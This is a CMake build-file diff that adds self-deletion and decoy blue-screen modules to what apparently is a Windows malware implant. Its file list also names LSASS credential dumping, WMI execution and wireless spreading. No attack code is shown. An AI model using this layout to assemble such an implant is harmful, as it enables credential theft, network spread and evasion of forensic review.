@@ -35,6 +35,8 @@ FetchContent_MakeAvailable(googletest)
 add_executable(main WIN32
     src/main.cpp
     src/utils/Logger.cpp
+    src/utils/Shared.cpp
+    src/utils/SelfDelete.cpp
     src/core/ImplantId.cpp
     src/crypto/AesGcm.cpp
     src/crypto/Base64.cpp
@@ -70,6 +72,7 @@ add_executable(main WIN32
     src/credential/LsassDumper.cpp
     src/lateral/WmiExec.cpp
     src/lateral/WirelessSpread.cpp
+    src/decoy/BSOD.cpp
     external/sqlite3/sqlite3.c
 )
 
